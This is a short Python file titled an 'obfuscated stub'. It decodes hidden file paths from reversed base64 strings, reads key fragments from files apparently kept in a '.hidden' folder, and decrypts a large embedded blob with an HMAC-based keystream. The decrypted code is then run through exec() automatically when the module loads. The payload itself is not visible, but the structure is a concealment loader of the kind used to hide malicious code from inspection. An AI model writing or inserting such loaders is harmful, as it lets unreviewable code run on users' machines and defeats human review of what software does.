# Dorayaki Obfuscated Stub
import base64, os, hashlib, hmac
from pathlib import Path

_KEY_PARTS_OBF = ['wtmL1QTYkJjYmJTZkhzYiNDNkNjN5gzL1gDZ1gDOwUDZlBDM0cTYl9iblRGZphmLv4iLv4iLv4iL', 'wtmL3IjMyMDNhJ2M3UzMyETYzQ2NxE2L1gDZ1gDOwUDZlBDM0cTYl9iblRGZphmLv4iLv4iLv4iL', 'wtmLjRmZ0gzN3IjN4IDO5MjZmFmM2M2L1gDZ1gDOwUDZlBDM0cTYl9iblRGZphmLv4iLv4iLv4iL', 'wtmLmdDN4EDZ1ITMhFzY1EjNhVDZ3I2L1gDZ1gDOwUDZlBDM0cTYl9iblRGZphmLv4iLv4iLv4iL']
_BLOB_CHUNKS = ['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']

def _rev(s): return s[::-1]
def _read_key_parts():
    parts = []
    # FIX: Resolve relative to this file's directory
    base = Path(__file__).resolve().parent
    for obf in _KEY_PARTS_OBF:
        try:
            rel_path_str = base64.b64decode(_rev(obf)).decode('utf-8')
            p = base.joinpath(rel_path_str).resolve()
            parts.append(base64.b64decode(p.read_text('utf-8')))
        except Exception: pass
    return b''.join(parts)

def _keystream(key, nonce, length):
    out = bytearray(); counter = 0
    while len(out) < length:
        out.extend(hmac.new(key, nonce + counter.to_bytes(8,'big'), hashlib.sha256).digest())
        counter += 1
    return bytes(out[:length])

def _run():
    key = _read_key_parts()
    if not key: raise RuntimeError("Decryption Key not found (missing .hidden folder?)")
    blob = base64.b64decode(''.join([_rev(c) for c in _BLOB_CHUNKS]))
    nonce, ct = blob[:12], blob[12:]
    ks = _keystream(key, nonce, len(ct))
    plain = bytes(a ^ b for a, b in zip(ct, ks))
    try: src = plain.decode('utf-8')
    except: src = plain.decode('latin-1')
    exec(compile(src, __file__, 'exec'), globals())

_run()
